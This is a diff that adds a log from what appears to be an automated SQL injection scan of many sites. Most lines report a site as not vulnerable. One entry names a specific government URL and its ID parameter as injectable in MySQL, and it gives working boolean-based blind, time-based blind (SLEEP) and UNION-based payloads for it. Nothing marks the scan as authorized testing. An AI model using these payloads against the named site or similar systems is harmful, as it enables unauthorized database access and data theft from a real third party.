@@ -1,0 +1,245 @@
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[+]url: http://duihua.zs.gov.cn:88/view/
+[+]query: ID=158
+[+]data: None
+[+]dbms: MySQL
+[+]suffix:  AND '[RANDSTR]'='[RANDSTR]
+[+]dbms_version: [u'>= 5.0.12']
+[+]prefix: '
+[+]place: GET
+[+]os: None
+[+]parameter ID
+---------------INJECTION    TYPE    1-----------------------
+[+]title: AND boolean-based blind - WHERE or HAVING clause
+[+]payload: ID=158' AND 4435=4435 AND 'DiuR'='DiuR
+[+]error: []
+
+---------------INJECTION    TYPE    5-----------------------
+[+]title: MySQL >= 5.0.12 AND time-based blind
+[+]payload: ID=158' AND SLEEP([SLEEPTIME]) AND 'DTyx'='DTyx
+[+]error: []
+
+---------------INJECTION    TYPE    6-----------------------
+[+]title: Generic UNION query (NULL) - 1 to 20 columns
+[+]payload: ID=-6121' UNION ALL SELECT NULL,CONCAT(0x7171627071,0x444b71574e4c5672426775536b5656494f6a74506b5643466b456a62426f5577556870625457716c,0x71767a7171),NULL,NULL,NULL,NULL,NULL,NULL-- UlKZ
+[+]error: []
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
+
+[!]this site are unvunlerable!
+
